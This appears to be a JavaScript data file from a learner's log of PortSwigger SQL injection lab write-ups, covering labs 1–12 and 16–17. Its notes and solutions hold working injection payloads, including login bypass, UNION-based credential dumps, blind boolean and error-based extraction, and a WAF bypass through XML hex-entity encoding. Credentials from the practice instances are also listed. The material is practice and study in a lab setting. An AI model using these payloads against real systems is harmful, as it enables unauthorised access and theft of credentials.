        title: 'Lab 16: Blind SQL injection with out-of-band data exfiltration',
        notes: [
          'Same blocker as Lab 15 - out-of-band exfiltration needs Collaborator, which is Professional-only.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST). Revisiting once upgraded.',
        status: 'blocked',
      },
      {
        title: 'Lab 17: SQL injection with filter bypass via XML encoding',
        notes: [
          'Intercepted the "Check Stock" request in Burp, which is where the XML-based injection point lives.',
          'A plain UNION SELECT NULL got blocked immediately with a 403 "Attack detected" response from the filter.',
          'Installed the Hackvertor extension in Burp and encoded the payload with hex_entities, which let the request through with a 200.',
          "Confirmed the injection point with an extra NULL, then used concatenation to get both fields out through the single visible field: UNION SELECT username || '~' || password FROM users.",
        ],
        solution:
          "UNION SELECT username || '~' || password FROM users\n\nCredentials found:\ncarlos~g6eafkale8omhjqkm6o7\nadministrator~ybqknjr1xvaa80bk7trd\nwiener~4hnvro74rym1ileky75x",
        status: 'completed',
      },
    ],
    tools: [
      'Burp Suite',
      'Burp Proxy',
      'Burp Repeater',
      'Hackvertor extension',
    ],
    tags: [
      'SQL injection',
      'error-based SQLi',
      'blind SQLi',
      'time-based blind',
      'WAF bypass',
      'PostgreSQL',
    ],
    links: [
      {
        label: 'SQL injection labs',
        url: 'https://portswigger.net/web-security/sql-injection',
      },
    ],
  },
  {
    id: 'portswigger-sqli-labs-11-12',
    date: '2026-07-29',
    category: 'PortSwigger Labs',
    title: 'SQL Injection labs 11-12 (blind, conditional responses and errors)',
    workedOn: [
      'Completed labs 11 and 12 on the PortSwigger SQL injection path',
      'Worked with blind SQL injection where no data or query error is returned directly to the page',
      'Wrote Python scripts to automate character-by-character password extraction, since Burp Intruder is not available on Community Edition',
    ],
    body: [
      'First real exposure to blind SQLi. Unlike the UNION labs, there is no data reflected on the page at all - the only signal is whether a "Welcome back" message appears or not, so the whole approach shifts to asking the database true/false questions one bit at a time.',
      'Doing this by hand for a 20-character password is not realistic, so this session doubled as an excuse to write my first proper SQLi automation scripts in Python.',
    ],
    labs: [
      {
        title: 'Lab 11: Blind SQL injection with conditional responses',
        notes: [
          "Confirmed the tracking cookie feeds into the query by appending ' and 1=1--' and comparing the response against 1=0.",
          "Confirmed a users table exists with: ' and (select 'x' FROM users LIMIT 1)='x'--",
          "Confirmed the administrator account exists with: ' and (select username FROM users WHERE username='administrator')='administrator'--",
          'Realised that comparing the password directly to a guess would just be brute-forcing the login form through the back door, so length and character enumeration was the way to go.',
          'Narrowed the password length with LENGTH(password)>N checks (true past 6, 10, and 15, false past 20), confirming 20 characters.',
          "Burp Intruder isn't available on Community Edition, so wrote a Python script to automate the substring(password,1,1) character comparisons instead of doing it manually.",
        ],
        solution:
          "' and (select username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--\n\nExtracted character-by-character via script.\n\nCredentials found:\nadministrator\nkk9s1reehirw9tayifqx",
        status: 'completed',
        script: 'LabScripts/sqli_solver.py',
      },
      {
        title: 'Lab 12: Blind SQL injection with conditional errors',
        notes: [
          'Different flavour of blind SQLi - this one forces a database error instead of a conditional message.',
          "Confirmed Oracle with: TrackingId=...' || (select '' FROM dual) || '",
          "Confirmed the users table exists using rownum so the query doesn't break: ' || (select '' FROM users WHERE rownum=1) || '",
          "Checking WHERE username='administrator' directly always returned 200 regardless of whether it matched, so a conditional error was needed instead.",
          "Built a CASE WHEN that only throws a divide-by-zero error when the condition is true: ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '",
          'First attempt failed from a missing (1/0) and a stray space in TO_CHAR.',
          "Used the same pattern against the users table to confirm the administrator account and narrow the password length to 20 characters, then scripted the rest since Intruder isn't available on Community Edition.",
        ],
        solution:
          "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>N) || '\n\nCredentials found:\nadministrator\n1jstrwe8vruggjowu1la",
        status: 'completed',
        script: 'LabScripts/lab12.py',
      },
    ],
    tools: ['Burp Suite', 'Burp Proxy', 'Burp Repeater', 'Python'],
    tags: [
      'SQL injection',
      'blind SQLi',
      'conditional responses',
      'conditional errors',
      'Oracle',
    ],
    links: [
      {
        label: 'SQL injection labs',
        url: 'https://portswigger.net/web-security/sql-injection',
      },
    ],
  },
  {
    id: 'portswigger-sqli-labs-1-10',
    date: '2026-07-28',
    category: 'PortSwigger Labs',
    title: 'SQL Injection labs 1-10 (Burp Suite)',
    workedOn: [
      'Completed labs 1-10 on the PortSwigger SQL injection path',
      'Used Burp Proxy to intercept traffic and Repeater to send payloads',
      'Worked through WHERE clause bypass, login bypass, UNION attacks across Oracle/MySQL/PostgreSQL, data type and column discovery, and dumping credentials',
    ],
    body: [
      'First proper session on the Web Security Academy SQL injection module. Burp Repeater was the main tool once I had a request captured from Proxy.',
      'Main takeaway: comment syntax and version functions change per database (-- vs #, v$version vs @@version vs version()). Getting the column count with ORDER BY (or the UNION SELECT NULL method) and confirming text columns with UNION SELECT came up in almost every lab.',
      "By Lab 10, I'd also picked up the || concatenation trick for squeezing two values (username and password) into a single visible column when the page only renders one field.",
    ],
    labs: [
      {
        title:
          'Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data',
        notes: [
          'Vulnerable parameter is the category filter on the product listing page.',
          'Appending a tautology to the WHERE clause returns all rows, including hidden ones.',
        ],
        solution: "GET /filter?category=Gifts' OR '1'='1",
        status: 'completed',
      },
      {
        title: 'Lab 2: SQL injection vulnerability allowing login bypass',
        notes: [
          "Adding a single quote (') caused the page to fail, confirming the input is passed into a SQL query.",
          'Goal was to log in as administrator. Testing username admin with a quote did not work.',
          "The login query looks like: SELECT firstname FROM users WHERE username='...' AND password='...'",
          "Using a comment to skip the password check: administrator'-- with any password value.",
        ],
        solution: "Username: administrator'--  |  Password: (anything)",
        status: 'completed',
      },
      {
        title:
          'Lab 3: SQL injection attack, querying the database type and version on Oracle',
        notes: [
          'Intercepted the category filter request in Burp Proxy and sent it to Repeater.',
          "category=Gifts' ORDER BY 1-- → 200",
          "category=Gifts' ORDER BY 2-- → 200",
          "category=Gifts' ORDER BY 3-- → 500, so 2 columns confirmed.",
          "category=Gifts' UNION SELECT 'a', 'a' FROM DUAL-- → 200. FROM DUAL confirms Oracle.",
        ],
        solution: "' UNION SELECT banner, NULL FROM v$version--",
        status: 'completed',
      },
      {
        title:
          'Lab 4: SQL injection attack, querying database type and version on MySQL and Microsoft',
        notes: [
          'Intercept via Burp, send to Repeater.',
          "category=Accessories' ORDER BY 1-- → 500. Comment syntax -- did not work here.",
          "category=Accessories' ORDER BY 1# → 200. # works as the comment character on this database.",
          'ORDER BY 2# → 200, ORDER BY 3# → 500. Two columns again.',
          'Both columns display text on the page.',
          "category=Accessories' UNION SELECT 'a', 'a'# → 200.",
          'Not Oracle (no FROM DUAL needed). Microsoft/SQL Server uses @@version.',
        ],
        solution: "' UNION SELECT @@version, NULL#",
        status: 'completed',
      },
      {
        title:
          'Lab 5: SQL injection attack, listing the database contents on non-Oracle databases',
        notes: [
          'Intercept and Repeater again on the category filter.',
          'ORDER BY 1-- and ORDER BY 2-- → 200. ORDER BY 3-- → 500. Two columns.',
          "UNION SELECT 'a', 'a'-- → 200. Both columns hold text.",
          '@@version → 500, so not Microsoft SQL Server.',
          'version() → 200, so PostgreSQL.',
          'UNION SELECT table_name, NULL FROM information_schema.tables-- → 200. Found table: users_ocetwc.',
          'First attempt at column lookup returned 500 because I wrote information.schema instead of information_schema.',
          "UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_ocetwc'-- → username_oslrwn and password_epjcib.",
          'Dumped credentials and logged in as administrator successfully.',
          'Remember the trailing -- on payloads; forgetting it caused a 500 more than once.',
        ],
        solution:
          "' UNION SELECT username_oslrwn, password_epjcib FROM users_ocetwc--\n\nCredentials found:\nadministrator\no0cg3skime8olq3u1au0",
        status: 'completed',
      },
      {
        title:
          'Lab 6: SQL injection attack, listing the database contents on Oracle',
        notes: [
          'Same goal as Lab 5, but adapted for Oracle syntax.',
          "category=Accessories' ORDER BY 1--, ORDER BY 2-- → 200, ORDER BY 3-- → 500. Two columns confirmed.",
          "UNION SELECT 'a', 'a'-- → 500 at first - missing FROM DUAL, which Oracle requires for a UNION with no real table.",
          "UNION SELECT 'a', 'a' FROM DUAL-- → 200, confirming Oracle (the query failing without DUAL was itself a giveaway).",
          'Reused the Lab 3 version query: UNION SELECT banner, NULL FROM v$version--',
          'UNION SELECT table_name, NULL FROM all_tables-- → found table USERS_QAXEJG.',
          "UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_QAXEJG'-- → USERNAME_XWMTOF, PASSWORD_QGYRAI.",
          'The PortSwigger cheat sheet was useful here for the Oracle-specific system tables (all_tables, all_tab_columns) instead of information_schema.',
        ],
        solution:
          "' UNION SELECT USERNAME_XWMTOF, PASSWORD_QGYRAI FROM USERS_QAXEJG--\n\nCredentials found:\nadministrator\no3u5naqxsdx95uck2hd8",
        status: 'completed',
      },
      {
        title:
          'Lab 7: SQL injection UNION attack, determining the number of columns returned by the query',
        notes: [
          'Two rules to remember for UNION: the number and order of columns must match across queries, and the data types must be compatible.',
          "Instead of ORDER BY, used ' UNION SELECT NULL-- and kept adding NULLs until the 500 error cleared.",
          "' UNION SELECT NULL, NULL, NULL-- returned 200, confirming three columns.",
        ],
        solution: "' UNION SELECT NULL, NULL, NULL--",
        status: 'completed',
      },
      {
        title:
          'Lab 8: SQL injection UNION attack, finding a column containing text',
        notes: [
          'Confirmed three columns using the NULL method from Lab 7.',
          "Tested each position individually: ' UNION SELECT 'a', NULL, NULL-- then ' UNION SELECT NULL, 'a', NULL--",
          'The second position came back 200, confirming that column accepts text.',
          'Initially used a placeholder value and expected the lab to complete on that alone, but the lab description actually asked for a specific value rather than an arbitrary string.',
          "Adjusted to the exact required value: ' UNION SELECT NULL, '2AxW05', NULL--",
        ],
        solution: "' UNION SELECT NULL, '2AxW05', NULL--",
        status: 'completed',
      },
      {
        title:
          'Lab 9: SQL injection UNION attack, retrieving data from other tables',
        notes: [
          "Confirmed two text columns with the usual ' UNION SELECT 'a', 'a'--",
          "Queried the users table directly: ' UNION SELECT username, password FROM users--",
          'Response was 200 and the credentials appeared directly on the product listing page.',
        ],
        solution:
          "' UNION SELECT username, password FROM users--\n\nCredentials found:\nadministrator\nu7p40o4mwjnw2eo4pb2b",
        status: 'completed',
      },
      {
        title:
          'Lab 10: SQL injection UNION attack, retrieving multiple values in a single column',
        notes: [
          'Confirmed two columns via ORDER BY, but only one column is actually rendered on the page - the other looks like an ID field.',
          "' UNION SELECT NULL, username FROM users-- surfaced all the usernames but not the passwords, and running it twice (once per field) felt clunky.",
          "Used the || concatenation operator to combine both values into the single visible column: ' UNION SELECT NULL, username || password FROM users--",
        ],
        solution: "' UNION SELECT NULL, username || password FROM users--",
        status: 'completed',
        screenshots: ['Burp/Lab10.webp'],
      },
    ],
    tools: ['Burp Suite', 'Burp Proxy', 'Burp Repeater'],
    tags: [
      'SQL injection',
      'UNION attacks',
      'Oracle',
      'MySQL',
      'PostgreSQL',
      'login bypass',
    ],
    links: [
      {
        label: 'SQL injection labs',
        url: 'https://portswigger.net/web-security/sql-injection',
      },
    ],
  },
]
